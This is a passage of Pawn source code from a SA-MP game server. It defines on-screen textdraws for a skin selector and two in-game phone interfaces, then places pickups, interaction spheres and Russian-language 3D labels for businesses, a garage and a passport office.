	TextDrawFont(Button[5], 2);
	TextDrawSetProportional(Button[5], 1);

	select_skin[0] = TextDrawCreate(257.666625, 376.237030, "cromulent:skin_select");
	TextDrawLetterSize(select_skin[0], 0.000000, 0.000000);
	TextDrawTextSize(select_skin[0], 133.666610, 56.829635);
	TextDrawAlignment(select_skin[0], 1);
	TextDrawColor(select_skin[0], -1);
	TextDrawSetShadow(select_skin[0], 0);
	TextDrawSetOutline(select_skin[0], 0);
	TextDrawFont(select_skin[0], 4);

	select_skin[1] = TextDrawCreate(265.333312, 393.659271, "cromulent:white");
	TextDrawLetterSize(select_skin[1], 0.000000, 0.000000);
	TextDrawTextSize(select_skin[1], 19.000000, 22.399993);
	TextDrawAlignment(select_skin[1], 1);
	TextDrawColor(select_skin[1], -1);
	TextDrawSetShadow(select_skin[1], 0);
	TextDrawSetOutline(select_skin[1], 0);
	TextDrawFont(select_skin[1], 4);
	TextDrawSetSelectable(select_skin[1], true);

	select_skin[2] = TextDrawCreate(303.000000, 403.199981, "cromulent:white");
	TextDrawLetterSize(select_skin[2], 0.000000, 0.000000);
	TextDrawTextSize(select_skin[2], 42.000000, 19.081512);
	TextDrawAlignment(select_skin[2], 1);
	TextDrawColor(select_skin[2], -1);
	TextDrawSetShadow(select_skin[2], 0);
	TextDrawSetOutline(select_skin[2], 0);
	TextDrawFont(select_skin[2], 4);
	TextDrawSetSelectable(select_skin[2], true);

	select_skin[3] = TextDrawCreate(365.666656, 392.414794, "cromulent:white");
	TextDrawLetterSize(select_skin[3], 0.000000, 0.000000);
	TextDrawTextSize(select_skin[3], 18.333343, 24.059265);
	TextDrawAlignment(select_skin[3], 1);
	TextDrawColor(select_skin[3], -1);
	TextDrawSetShadow(select_skin[3], 0);
	TextDrawSetOutline(select_skin[3], 0);
	TextDrawFont(select_skin[3], 4);
	TextDrawSetSelectable(select_skin[3], true);

	PhoneIP[0] = TextDrawCreate(498.975311, 155.750045, "LD_POOL:ball");
	TextDrawLetterSize(PhoneIP[0], 30.000000, 30.000000);
	TextDrawTextSize(PhoneIP[0], 30.468521, 30.916709);
	TextDrawAlignment(PhoneIP[0], 2);
	TextDrawColor(PhoneIP[0], 255);
	TextDrawSetShadow(PhoneIP[0], 0);
	TextDrawSetOutline(PhoneIP[0], 0);
	TextDrawFont(PhoneIP[0], 4);

	PhoneIP[1] = TextDrawCreate(560.351501, 155.750091, "LD_POOL:ball");
	TextDrawLetterSize(PhoneIP[1], 0.000000, 0.000000);
	TextDrawTextSize(PhoneIP[1], 31.390930, 31.499984);
	TextDrawAlignment(PhoneIP[1], 1);
	TextDrawColor(PhoneIP[1], 255);
	TextDrawSetShadow(PhoneIP[1], 0);
	TextDrawSetOutline(PhoneIP[1], 0);
	TextDrawFont(PhoneIP[1], 4);

	PhoneIP[2] = TextDrawCreate(559.415039, 329.583221, "LD_POOL:ball");
	TextDrawLetterSize(PhoneIP[2], 0.000000, 0.000000);
	TextDrawTextSize(PhoneIP[2], 31.859436, 31.500015);
	TextDrawAlignment(PhoneIP[2], 1);
	TextDrawColor(PhoneIP[2], 255);
	TextDrawSetShadow(PhoneIP[2], 0);
	TextDrawSetOutline(PhoneIP[2], 0);
	TextDrawFont(PhoneIP[2], 4);

	PhoneIP[3] = TextDrawCreate(499.443450, 171.500030, "LD_SPAC:white");
	TextDrawLetterSize(PhoneIP[3], 0.000000, 0.000000);
	TextDrawTextSize(PhoneIP[3], 91.830200, 176.166656);
	TextDrawAlignment(PhoneIP[3], 1);
	TextDrawColor(PhoneIP[3], 255);
	TextDrawSetShadow(PhoneIP[3], 0);
	TextDrawSetOutline(PhoneIP[3], 0);
	TextDrawFont(PhoneIP[3], 4);

	PhoneIP[4] = TextDrawCreate(514.436218, 156.333343, "LD_SPAC:white");
	TextDrawLetterSize(PhoneIP[4], 0.000000, 0.000000);
	TextDrawTextSize(PhoneIP[4], 66.530044, 204.750030);
	TextDrawAlignment(PhoneIP[4], 1);
	TextDrawColor(PhoneIP[4], 255);
	TextDrawSetShadow(PhoneIP[4], 0);
	TextDrawSetOutline(PhoneIP[4], 0);
	TextDrawFont(PhoneIP[4], 4);

	PhoneIP[5] = TextDrawCreate(535.051208, 340.083312, "LD_POOL:ball");
	TextDrawLetterSize(PhoneIP[5], 0.000000, 0.000000);
	TextDrawTextSize(PhoneIP[5], 20.146484, 18.083335);
	TextDrawAlignment(PhoneIP[5], 1);
	TextDrawColor(PhoneIP[5], -1);
	TextDrawSetShadow(PhoneIP[5], 0);
	TextDrawSetOutline(PhoneIP[5], 0);
	TextDrawFont(PhoneIP[5], 4);

	PhoneIP[6] = TextDrawCreate(536.456848, 341.249908, "LD_POOL:ball");
	TextDrawLetterSize(PhoneIP[6], 0.000000, 0.000000);
	TextDrawTextSize(PhoneIP[6], 17.335250, 15.750019);
	TextDrawAlignment(PhoneIP[6], 1);
	TextDrawColor(PhoneIP[6], 255);
	TextDrawSetShadow(PhoneIP[6], 0);
	TextDrawSetOutline(PhoneIP[6], 0);
	TextDrawFont(PhoneIP[6], 4);

	PhoneIP[7] = TextDrawCreate(501.317749, 179.083328, "loadsc5:loadsc5");
	TextDrawLetterSize(PhoneIP[7], 0.000000, 0.000000);
	TextDrawTextSize(PhoneIP[7], 88.082000, 158.083343);
	TextDrawAlignment(PhoneIP[7], 1);
	TextDrawColor(PhoneIP[7], -1061109505);
	TextDrawSetShadow(PhoneIP[7], 0);
	TextDrawSetOutline(PhoneIP[7], 0);
	TextDrawFont(PhoneIP[7], 4);

	PhoneIP[8] = TextDrawCreate(533.645629, 169.166656, "LD_POOL:ball");
	TextDrawLetterSize(PhoneIP[8], 0.000000, 0.000000);
	TextDrawTextSize(PhoneIP[8], 22.488967, 1.749999);
	TextDrawAlignment(PhoneIP[8], 1);
	TextDrawColor(PhoneIP[8], -1061109505);
	TextDrawSetShadow(PhoneIP[8], 0);
	TextDrawSetOutline(PhoneIP[8], 0);
	TextDrawFont(PhoneIP[8], 4);

	PhoneIP[9] = TextDrawCreate(542.079711, 159.833297, "o");
	TextDrawLetterSize(PhoneIP[9], 0.259311, 0.789166);
	TextDrawAlignment(PhoneIP[9], 1);
	TextDrawColor(PhoneIP[9], -2139062017);
	TextDrawSetShadow(PhoneIP[9], 0);
	TextDrawSetOutline(PhoneIP[9], 1);
	TextDrawBackgroundColor(PhoneIP[9], 51);
	TextDrawFont(PhoneIP[9], 1);
	TextDrawSetProportional(PhoneIP[9], 1);

	PhoneIP[10] = TextDrawCreate(588.588623, 182.916671, "usebox");
	TextDrawLetterSize(PhoneIP[10], 0.000000, 0.007406);
	TextDrawTextSize(PhoneIP[10], 575.686706, 0.000000);
	TextDrawAlignment(PhoneIP[10], 1);
	TextDrawColor(PhoneIP[10], 0);
	TextDrawUseBox(PhoneIP[10], true);
	TextDrawBoxColor(PhoneIP[10], 102);
	TextDrawSetShadow(PhoneIP[10], 0);
	TextDrawSetOutline(PhoneIP[10], 0);
	TextDrawFont(PhoneIP[10], 0);

	PhoneIP[11] = TextDrawCreate(578.155273, 181.416656, "LD_SPAC:white");
	TextDrawLetterSize(PhoneIP[11], 0.000000, 0.000000);
	TextDrawTextSize(PhoneIP[11], 8.433349, 3.500000);
	TextDrawAlignment(PhoneIP[11], 1);
	TextDrawColor(PhoneIP[11], 16711935);
	TextDrawSetShadow(PhoneIP[11], 0);
	TextDrawSetOutline(PhoneIP[11], 0);
	TextDrawFont(PhoneIP[11], 4);

	PhoneIP[12] = TextDrawCreate(569.721740, 178.499984, "H");
	TextDrawLetterSize(PhoneIP[12], 0.146398, 0.888332);
	TextDrawAlignment(PhoneIP[12], 1);
	TextDrawColor(PhoneIP[12], -1);
	TextDrawSetShadow(PhoneIP[12], 0);
	TextDrawSetOutline(PhoneIP[12], 1);
	TextDrawBackgroundColor(PhoneIP[12], 51);
	TextDrawFont(PhoneIP[12], 2);
	TextDrawSetProportional(PhoneIP[12], 1);

	PhoneIP[13] = TextDrawCreate(505.065765, 194.833389, "12:34");
	TextDrawLetterSize(PhoneIP[13], 0.455153, 2.370001);
	TextDrawAlignment(PhoneIP[13], 1);
	TextDrawColor(PhoneIP[13], -1);
	TextDrawSetShadow(PhoneIP[13], 0);
	TextDrawSetOutline(PhoneIP[13], 1);
	TextDrawBackgroundColor(PhoneIP[13], 51);
	TextDrawFont(PhoneIP[13], 2);
	TextDrawSetProportional(PhoneIP[13], 1);

	PhoneIP[14] = TextDrawCreate(505.534332, 217.000015, "12.01.2017");
	TextDrawLetterSize(PhoneIP[14], 0.233543, 0.946666);
	TextDrawAlignment(PhoneIP[14], 1);
	TextDrawColor(PhoneIP[14], -1);
	TextDrawSetShadow(PhoneIP[14], 0);
	TextDrawSetOutline(PhoneIP[14], 1);
	TextDrawBackgroundColor(PhoneIP[14], 51);
	TextDrawFont(PhoneIP[14], 2);
	TextDrawSetProportional(PhoneIP[14], 1);

	PhoneIP[15] = TextDrawCreate(591.399719, 317.083312, "usebox");
	TextDrawLetterSize(PhoneIP[15], 0.000000, 2.016666);
	TextDrawTextSize(PhoneIP[15], 498.380676, 0.000000);
	TextDrawAlignment(PhoneIP[15], 1);
	TextDrawColor(PhoneIP[15], 0);
	TextDrawUseBox(PhoneIP[15], true);
	TextDrawBoxColor(PhoneIP[15], 102);
	TextDrawSetShadow(PhoneIP[15], 0);
	TextDrawSetOutline(PhoneIP[15], 0);
	TextDrawFont(PhoneIP[15], 0);

	PhoneIP[16] = TextDrawCreate(526.149291, 318.499969, "LD_SPAC:white");
	TextDrawLetterSize(PhoneIP[16], 0.000000, 0.000000);
	TextDrawTextSize(PhoneIP[16], 15.929748, 15.750041);
	TextDrawAlignment(PhoneIP[16], 2);
	TextDrawColor(PhoneIP[16], -1378294017);
	TextDrawSetShadow(PhoneIP[16], 0);
	TextDrawSetOutline(PhoneIP[16], 0);
	TextDrawFont(PhoneIP[16], 4);

	PhoneIP[17] = TextDrawCreate(504.597412, 318.500000, "LD_SPAC:white");
	TextDrawLetterSize(PhoneIP[17], 0.000000, 0.000000);
	TextDrawTextSize(PhoneIP[17], 15.461181, 15.750020);
	TextDrawAlignment(PhoneIP[17], 1);
	TextDrawColor(PhoneIP[17], 16711935);
	TextDrawSetShadow(PhoneIP[17], 0);
	TextDrawSetOutline(PhoneIP[17], 0);
	TextDrawFont(PhoneIP[17], 4);

	PhoneIP[18] = TextDrawCreate(548.169799, 319.083312, "LD_SPAC:white");
	TextDrawLetterSize(PhoneIP[18], 0.000000, 0.000000);
	TextDrawTextSize(PhoneIP[18], 15.461181, 15.750000);
	TextDrawAlignment(PhoneIP[18], 1);
	TextDrawColor(PhoneIP[18], -65281);
	TextDrawSetShadow(PhoneIP[18], 0);
	TextDrawSetOutline(PhoneIP[18], 0);
	TextDrawFont(PhoneIP[18], 4);

	PhoneIP[19] = TextDrawCreate(569.253356, 319.083404, "LD_SPAC:white");
	TextDrawLetterSize(PhoneIP[19], 0.000000, 0.000000);
	TextDrawTextSize(PhoneIP[19], 15.461181, 15.166687);
	TextDrawAlignment(PhoneIP[19], 1);
	TextDrawColor(PhoneIP[19], -2147483393);
	TextDrawSetShadow(PhoneIP[19], 0);
	TextDrawSetOutline(PhoneIP[19], 0);
	TextDrawFont(PhoneIP[19], 4);

	PhoneIP[20] = TextDrawCreate(506.002655, 322.000030, "?");
	TextDrawLetterSize(PhoneIP[20], 0.497788, 0.748333);
	TextDrawAlignment(PhoneIP[20], 1);
	TextDrawColor(PhoneIP[20], -1);
	TextDrawSetShadow(PhoneIP[20], 0);
	TextDrawSetOutline(PhoneIP[20], 1);
	TextDrawBackgroundColor(PhoneIP[20], 51);
	TextDrawFont(PhoneIP[20], 2);
	TextDrawSetProportional(PhoneIP[20], 1);

	PhoneIP[21] = TextDrawCreate(528.023498, 320.833343, "ld_grav:flwr");
	TextDrawLetterSize(PhoneIP[21], 0.000000, 0.000000);
	TextDrawTextSize(PhoneIP[21], 9.370431, 11.083314);
	TextDrawAlignment(PhoneIP[21], 1);
	TextDrawColor(PhoneIP[21], -1);
	TextDrawSetShadow(PhoneIP[21], 0);
	TextDrawSetOutline(PhoneIP[21], 0);
	TextDrawFont(PhoneIP[21], 4);

	PhoneIP[22] = TextDrawCreate(551.918090, 318.499877, "C");
	TextDrawLetterSize(PhoneIP[22], 0.323499, 1.629168);
	TextDrawAlignment(PhoneIP[22], 1);
	TextDrawColor(PhoneIP[22], -1);
	TextDrawSetShadow(PhoneIP[22], 0);
	TextDrawSetOutline(PhoneIP[22], 1);
	TextDrawBackgroundColor(PhoneIP[22], 51);
	TextDrawFont(PhoneIP[22], 2);
	TextDrawSetProportional(PhoneIP[22], 1);

	PhoneIP[23] = TextDrawCreate(572.064392, 318.500091, "S");
	TextDrawLetterSize(PhoneIP[23], 0.449999, 1.600000);
	TextDrawAlignment(PhoneIP[23], 1);
	TextDrawColor(PhoneIP[23], -1);
	TextDrawSetShadow(PhoneIP[23], 0);
	TextDrawSetOutline(PhoneIP[23], 1);
	TextDrawBackgroundColor(PhoneIP[23], 51);
	TextDrawFont(PhoneIP[23], 2);
	TextDrawSetProportional(PhoneIP[23], 1);

	PhoneIP[24] = TextDrawCreate(565.036682, 153.999984, "LD_SPAC:white");
	TextDrawLetterSize(PhoneIP[24], 0.000000, 0.000000);
	TextDrawTextSize(PhoneIP[24], 10.776000, 2.333343);
	TextDrawAlignment(PhoneIP[24], 1);
	TextDrawColor(PhoneIP[24], 523185967);
	TextDrawSetShadow(PhoneIP[24], 0);
	TextDrawSetOutline(PhoneIP[24], 0);
	TextDrawFont(PhoneIP[24], 4);

	PhoneSA[0] = TextDrawCreate(493.750000, 163.749977, "ld_pool:ball");//вверх л бок т
 	TextDrawLetterSize(PhoneSA[0], 0.000000, 0.000000);
  	TextDrawTextSize(PhoneSA[0], 25.625000, 21.583322);
   	TextDrawAlignment(PhoneSA[0], 1);
    TextDrawColor(PhoneSA[0], 255);
    TextDrawSetShadow(PhoneSA[0], 0);
    TextDrawSetOutline(PhoneSA[0], 0);
    TextDrawFont(PhoneSA[0], 4);

	PhoneSA[1] = TextDrawCreate(582.875000, 163.583290, "ld_pool:ball");//вверх п бок т
 	TextDrawLetterSize(PhoneSA[1], 0.000000, 0.000000);
  	TextDrawTextSize(PhoneSA[1], 25.625000, 21.583322);
   	TextDrawAlignment(PhoneSA[1], 1);
   	TextDrawColor(PhoneSA[1], 255);
   	TextDrawSetShadow(PhoneSA[1], 0);
    TextDrawSetOutline(PhoneSA[1], 0);
    TextDrawFont(PhoneSA[1], 4);

	PhoneSA[2] = TextDrawCreate(493.875000, 354.166656, "ld_pool:ball");//низ л бок т
	TextDrawLetterSize(PhoneSA[2], 0.000000, 0.000000);
	TextDrawTextSize(PhoneSA[2], 25.625000, 21.583322);
	TextDrawAlignment(PhoneSA[2], 1);
	TextDrawColor(PhoneSA[2], 255);
	TextDrawSetShadow(PhoneSA[2], 0);
	TextDrawSetOutline(PhoneSA[2], 0);
	TextDrawFont(PhoneSA[2], 4);

	PhoneSA[3] = TextDrawCreate(583.000000, 354.000061, "ld_pool:ball");//низ п бок т
	TextDrawLetterSize(PhoneSA[3], 0.000000, 0.000000);
	TextDrawTextSize(PhoneSA[3], 25.625000, 21.583322);
	TextDrawAlignment(PhoneSA[3], 1);
	TextDrawColor(PhoneSA[3], 255);
	TextDrawSetShadow(PhoneSA[3], 0);
	TextDrawSetOutline(PhoneSA[3], 0);
	TextDrawFont(PhoneSA[3], 4);

	PhoneSA[4] = TextDrawCreate(610.750000, 175.166648, "usebox");
	TextDrawLetterSize(PhoneSA[4], 0.000000, 21.137035);
	TextDrawTextSize(PhoneSA[4], 491.750000, 0.000000);
	TextDrawAlignment(PhoneSA[4], 1);
	TextDrawColor(PhoneSA[4], -1);
	TextDrawUseBox(PhoneSA[4], true);
	TextDrawBoxColor(PhoneSA[4], 255);
	TextDrawSetShadow(PhoneSA[4], 0);
	TextDrawSetOutline(PhoneSA[4], 0);
	TextDrawFont(PhoneSA[4], 0);

	PhoneSA[5] = TextDrawCreate(601.375000, 165.833335, "usebox");
	TextDrawLetterSize(PhoneSA[5], 0.000000, 23.016664);
	TextDrawTextSize(PhoneSA[5], 503.625000, 0.000000);
	TextDrawAlignment(PhoneSA[5], 1);
	TextDrawColor(PhoneSA[5], 0);
	TextDrawUseBox(PhoneSA[5], true);
	TextDrawBoxColor(PhoneSA[5], 255);
	TextDrawSetShadow(PhoneSA[5], 0);
	TextDrawSetOutline(PhoneSA[5], 0);
	TextDrawFont(PhoneSA[5], 0);

	PhoneSA[6] = TextDrawCreate(498.750000, 180.666656, "loadsc8:loadsc8");//обои
	TextDrawLetterSize(PhoneSA[6], 0.000000, 0.000000);
	TextDrawTextSize(PhoneSA[6], 106.250000, 172.666656);
	TextDrawAlignment(PhoneSA[6], 1);
	TextDrawColor(PhoneSA[6], -1);
	TextDrawSetShadow(PhoneSA[6], 0);
	TextDrawSetOutline(PhoneSA[6], 0);
	TextDrawFont(PhoneSA[6], 4);

	PhoneSA[7] = TextDrawCreate(545.000000, 355.666717, "ld_pool:ball");
	TextDrawLetterSize(PhoneSA[7], 0.000000, 0.000000);
	TextDrawTextSize(PhoneSA[7], 18.125000, 16.333332);
	TextDrawAlignment(PhoneSA[7], 1);
	TextDrawColor(PhoneSA[7], -2139062017);
	TextDrawSetShadow(PhoneSA[7], 0);
	TextDrawSetOutline(PhoneSA[7], 0);
	TextDrawFont(PhoneSA[7], 4);
	TextDrawSetSelectable(PhoneSA[7], 1);

	PhoneSA[8] = TextDrawCreate(531.250000, 166.666671, "JSPHONE");
	TextDrawLetterSize(PhoneSA[8], 0.226874, 1.039999);
	TextDrawAlignment(PhoneSA[8], 1);
	TextDrawColor(PhoneSA[8], -2139062017);
	TextDrawSetShadow(PhoneSA[8], 0);
	TextDrawSetOutline(PhoneSA[8], 1);
	TextDrawBackgroundColor(PhoneSA[8], 51);
	TextDrawFont(PhoneSA[8], 2);
	TextDrawSetProportional(PhoneSA[8], 1);

	PhoneSA[9] = TextDrawCreate(607.625000, 182.750000, "usebox");//Верх паннель
	TextDrawLetterSize(PhoneSA[9], 0.000000, 0.461111);
	TextDrawTextSize(PhoneSA[9], 496.125000, 0.000000);
	TextDrawAlignment(PhoneSA[9], 1);
	TextDrawColor(PhoneSA[9], 0);
	TextDrawUseBox(PhoneSA[9], true);
	TextDrawBoxColor(PhoneSA[9], 102);
	TextDrawSetShadow(PhoneSA[9], 0);
	TextDrawSetOutline(PhoneSA[9], 0);
	TextDrawFont(PhoneSA[9], 0);

	PhoneSA[10] = TextDrawCreate(508.875000, 183.916656, "usebox");
	TextDrawLetterSize(PhoneSA[10], 0.000000, 0.201854);
	TextDrawTextSize(PhoneSA[10], 499.250000, 0.000000);
	TextDrawAlignment(PhoneSA[10], 1);
	TextDrawColor(PhoneSA[10], 0);
	TextDrawUseBox(PhoneSA[10], true);
	TextDrawBoxColor(PhoneSA[10], 102);
	TextDrawSetShadow(PhoneSA[10], 0);
	TextDrawSetOutline(PhoneSA[10], 0);
	TextDrawFont(PhoneSA[10], 0);

	PhoneSA[11] = TextDrawCreate(507.625000, 185.666671, "");//usebox
	TextDrawLetterSize(PhoneSA[11], 0.000000, 0.007406);
	TextDrawTextSize(PhoneSA[11], 500.500000, 0.000000);
	TextDrawAlignment(PhoneSA[11], 1);
	TextDrawColor(PhoneSA[11], 0);
	TextDrawUseBox(PhoneSA[11], true);
	TextDrawBoxColor(PhoneSA[11], 0xffffffff);//16711935
	TextDrawSetShadow(PhoneSA[11], 0);
	TextDrawSetOutline(PhoneSA[11], 0);
	TextDrawFont(PhoneSA[11], 0);

	PhoneSA[12] = TextDrawCreate(507.000000, 230.500000, "Т");
	TextDrawLetterSize(PhoneSA[12], 0.449999, 1.600000);
	TextDrawAlignment(PhoneSA[12], 1);
	TextDrawColor(PhoneSA[12], -1);
	TextDrawSetShadow(PhoneSA[12], 0);
	TextDrawSetOutline(PhoneSA[12], 1);
	TextDrawBackgroundColor(PhoneSA[12], 51);
	TextDrawFont(PhoneSA[12], 2);
	TextDrawSetProportional(PhoneSA[12], 1);

	PhoneSA[13] = TextDrawCreate(500.000000, 200.000000, "LD_SPAC:white");//1 кнопка 1 ряд с вверху
	TextDrawLetterSize(PhoneSA[13], 0.000000, 0.000000);
	TextDrawTextSize(PhoneSA[13], 22.000000, 22.000000);
	TextDrawAlignment(PhoneSA[13], 1);
	TextDrawColor(PhoneSA[13], 0xffff00ff);
	TextDrawSetShadow(PhoneSA[13], 0);
	TextDrawSetOutline(PhoneSA[13], 0);
	TextDrawFont(PhoneSA[13], 4);
	TextDrawSetSelectable(PhoneSA[13], 1);

	PhoneSA[14] = TextDrawCreate(507.000000, 203.500000, "С");
	TextDrawLetterSize(PhoneSA[14], 0.449999, 1.600000);
	TextDrawAlignment(PhoneSA[14], 1);
	TextDrawColor(PhoneSA[14], -1);
	TextDrawSetShadow(PhoneSA[14], 0);
	TextDrawSetOutline(PhoneSA[14], 1);
	TextDrawBackgroundColor(PhoneSA[14], 51);
	TextDrawFont(PhoneSA[14], 2);
	TextDrawSetProportional(PhoneSA[14], 1);

	PhoneSA[15] = TextDrawCreate(586.250000, 169.000030, "ld_pool:ball");
	TextDrawLetterSize(PhoneSA[15], 0.000000, 0.000000);
	TextDrawTextSize(PhoneSA[15], 4.375000, 4.666646);
	TextDrawAlignment(PhoneSA[15], 1);
	TextDrawColor(PhoneSA[15], -5963521);
	TextDrawSetShadow(PhoneSA[15], 0);
	TextDrawSetOutline(PhoneSA[15], 0);
	TextDrawFont(PhoneSA[15], 4);

	PhoneSA[16] = TextDrawCreate(527.000000, 200.000000, "LD_SPAC:white");//2 кнопка 1 ряд с вверху
	TextDrawLetterSize(PhoneSA[16], 0.000000, 0.000000);
	TextDrawTextSize(PhoneSA[16], 22.000000, 22.000000);
	TextDrawAlignment(PhoneSA[16], 1);
	TextDrawColor(PhoneSA[16], 0x00ff00ff);
	TextDrawSetShadow(PhoneSA[16], 0);
	TextDrawSetOutline(PhoneSA[16], 0);
	TextDrawFont(PhoneSA[16], 4);
	TextDrawSetSelectable(PhoneSA[16], 1);

	PhoneSA[17] = TextDrawCreate(534.000000, 203.500000, "П");
	TextDrawLetterSize(PhoneSA[17], 0.449999, 1.600000);
	TextDrawAlignment(PhoneSA[17], 1);
	TextDrawColor(PhoneSA[17], -1);
	TextDrawSetShadow(PhoneSA[17], 0);
	TextDrawSetOutline(PhoneSA[17], 1);
	TextDrawBackgroundColor(PhoneSA[17], 51);
	TextDrawFont(PhoneSA[17], 2);
	TextDrawSetProportional(PhoneSA[17], 1);

	PhoneSA[18] = TextDrawCreate(554.000000, 200.000000, "LD_SPAC:white");//3 кнопка 1 ряд с вверху
	TextDrawLetterSize(PhoneSA[18], 0.000000, 0.000000);
	TextDrawTextSize(PhoneSA[18], 22.000000, 22.000000);
	TextDrawAlignment(PhoneSA[18], 1);
	TextDrawColor(PhoneSA[18], -16776961);
	TextDrawSetShadow(PhoneSA[18], 0);
	TextDrawSetOutline(PhoneSA[18], 0);
	TextDrawFont(PhoneSA[18], 4);
	TextDrawSetSelectable(PhoneSA[18], 1);

	PhoneSA[19] = TextDrawCreate(561.000000, 203.500000, "К");
	TextDrawLetterSize(PhoneSA[19], 0.449999, 1.600000);
	TextDrawAlignment(PhoneSA[19], 1);
	TextDrawColor(PhoneSA[19], -1);
	TextDrawSetShadow(PhoneSA[19], 0);
	TextDrawSetOutline(PhoneSA[19], 1);
	TextDrawBackgroundColor(PhoneSA[19], 51);
	TextDrawFont(PhoneSA[19], 2);
	TextDrawSetProportional(PhoneSA[19], 1);

	PhoneSA[20] = TextDrawCreate(581.000000, 200.000000, "LD_SPAC:white");//4 кнопка 1 ряд с вверху
	TextDrawLetterSize(PhoneSA[20], 0.000000, 0.000000);
	TextDrawTextSize(PhoneSA[20], 22.000000, 22.000000);
	TextDrawAlignment(PhoneSA[20], 1);
	TextDrawColor(PhoneSA[20], 0x0000f5ff);
	TextDrawSetShadow(PhoneSA[20], 0);
	TextDrawSetOutline(PhoneSA[20], 0);
	TextDrawFont(PhoneSA[20], 4);
	TextDrawSetSelectable(PhoneSA[20], 1);

	PhoneSA[21] = TextDrawCreate(588.000000, 203.500000, "И");
	TextDrawLetterSize(PhoneSA[21], 0.449999, 1.600000);
	TextDrawAlignment(PhoneSA[21], 1);
	TextDrawColor(PhoneSA[21], -1);
	TextDrawSetShadow(PhoneSA[21], 0);
	TextDrawSetOutline(PhoneSA[21], 1);
	TextDrawBackgroundColor(PhoneSA[21], 51);
	TextDrawFont(PhoneSA[21], 2);
	TextDrawSetProportional(PhoneSA[21], 1);

	PhoneSA[22] = TextDrawCreate(500.000000, 227.000000, "LD_SPAC:white");//1 кнопка 2 ряд с вверху
	TextDrawLetterSize(PhoneSA[22], 0.000000, 0.000000);
	TextDrawTextSize(PhoneSA[22], 22.000000, 22.000000);
	TextDrawAlignment(PhoneSA[22], 1);
	TextDrawColor(PhoneSA[22], 0xa3877eff);
	TextDrawSetShadow(PhoneSA[22], 0);
	TextDrawSetOutline(PhoneSA[22], 0);
	TextDrawFont(PhoneSA[22], 4);
	TextDrawSetSelectable(PhoneSA[22], 1);

	PhoneSA[23] = TextDrawCreate(507.000000, 230.500000, "Т");
	TextDrawLetterSize(PhoneSA[23], 0.449999, 1.600000);
	TextDrawAlignment(PhoneSA[23], 1);
	TextDrawColor(PhoneSA[23], -1);
	TextDrawSetShadow(PhoneSA[23], 0);
	TextDrawSetOutline(PhoneSA[23], 1);
	TextDrawBackgroundColor(PhoneSA[23], 51);
	TextDrawFont(PhoneSA[23], 2);
	TextDrawSetProportional(PhoneSA[23], 1);
}

stock LoadPickups()
{
	bank_money_pickup = -1;
	/*for(new i; i < sizeof PresentObject; i ++)
	{
		g_pickup_present[i] = CreatePickup(19343, 23, PresentObject[i][0], PresentObject[i][1], PresentObject[i][2]);
	}*/
	CreatePickup(1274, 1, 500.9015,-16.1483,1904.9518, -1);
	CreatePickup(19133, 1, 92.2885,-166.0693,996.7797, -1); // хз че это, в небе
	CreatePickup(19133, 1, 514.6105,-73.8570,1398.2188, -1); // хз че это, в небе
	CreatePickup(19133, 1, 468.5620,-61.4008,1408.6062, -1); // хз че это, в небе
	CreatePickup(19133, 1, 363.9392,-73.1163,1411.6899, -1); // хз че это, в небе
	CreatePickup(1239, 1, -236.6516,413.3671,1003.5000, -1);

	// пикапы для бизнесов
	CreatePickup(1275, 1, -913.6543,1211.7676,1002.0200, -1);
	CreatePickup(1274, 1, 449.2993,2508.3315,3018.4202, -1);
	CreatePickup(1274, 1, -724.6412, 206.7564, 2022.7360, -1);
	CreatePickup(1274, 1, 377.3217,-67.8903,1001.5151, -1);
	CreatePickup(1274, 1, 369.6516,-6.3217,1001.8589, -1);
	CreatePickup(1274, 1, 499.2758,-20.7244,1000.6797, -1);
	CreatePickup(1274, 1, -2659.1587,1416.9315,906.2734, -1);
	CreatePickup(1274, 1, 1214.1865,-12.9937,1000.9219, -1);
	CreatePickup(1274, 1, -1498.5411, -300.3899, 1762.5275, -1);
	CreatePickup(1274, 1, 541.7650,-851.2516,1002.0000, -1);
	CreatePickup(1274, 1, -186.4855, 856.6979, 2612.4531, -1);
	CreatePickup(1274, 1, 1613.3817,997.2397,1819.0200, -1);

    AreaInfo[arServerHelp] = CreateDynamicSphere(125.9063,792.5054,12.3825,1.0);
    CreatePickup(1239,1,125.9063,792.5054,12.3825);


	for(new i = 0; i != sizeof coord_checkpoint_miner; i ++)
	{
		CreateDynamic3DTextLabel("Месторождение\nсырья", 0xffac00FF, coord_checkpoint_miner[i][0],coord_checkpoint_miner[i][1],coord_checkpoint_miner[i][2], 10.0);
	}

	//CreateDynamic3DTextLabel("{EF5C06}Меню гаража\n{FFFFFF}Используйте: /gmenu",0xBBBBBBFF,-1613.6310,1581.6837,2005.7100,10.0);
	CreateDynamic3DTextLabel("{EF5C06}Выйти из гаража\n{FFFFFF}ALT\n\n{EF5C06}Выехать из гаража\n{FFFFFF}H",0xBBBBBBFF,-1621.5767,1578.9402,2005.7100,10.0);

    CreateDynamic3DTextLabel("{FFCD00}Выйти из гаража {FFFFFF}«ALT»\n{FFCD00}Выехать из гаража {FFFFFF}«H»", 0xBBBBBBFF, GARAGE_CAR_POSITION, 10.0);

	CreateDynamic3DTextLabel("/bomb",COLOR_BBLUE, 525.3550,657.5536,3591.5991+1.0,10.0);

	AreaInfo[arAdminsZoneHP] = CreateDynamicSphere(2332.6069,-1143.9352,1054.3047,1.0,55);
	CreatePickup(1240,1,2332.6069,-1143.9352,1054.3047,55);

	AreaInfo[arHotdogHP] = CreateDynamicSphere(130.1558,790.7570,12.3825,1.0);
	CreatePickup(1582,1,130.1558,790.7570,12.3825);

	AreaInfo[arGettingPassport][0] = CreateDynamicSphere(-901.9307,843.3348,2512.9500,1.0,0,0);
	AreaInfo[arGettingPassport][1] = CreateDynamicSphere(359.1528,184.3584,1008.3828,1.0,2,3);
	AreaInfo[arGettingPassport][2] = CreateDynamicSphere(359.1528,184.3584,1008.3828,1.0,3,3);
	AreaInfo[arGettingPassport][3] = CreateDynamicSphere(1198.2128,-609.9985,998.0313,1.0,4,6);
	CreatePickup(1239,1,-901.9307,843.3348,2512.9500,0);
	CreatePickup(1239,1,359.1528,184.3584,1008.3828,2);
	CreatePickup(1239,1,359.1528,184.3584,1008.3828,3);
	CreatePickup(1239,1,1198.2128,-609.9985,998.0313,4);
	CreateDynamic3DTextLabel("Получение паспорта\n{AFAFAF}Встаньте на пикап",COLOR_GREEN,-901.9307,843.3348,2512.9500,15.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,-1,-1);
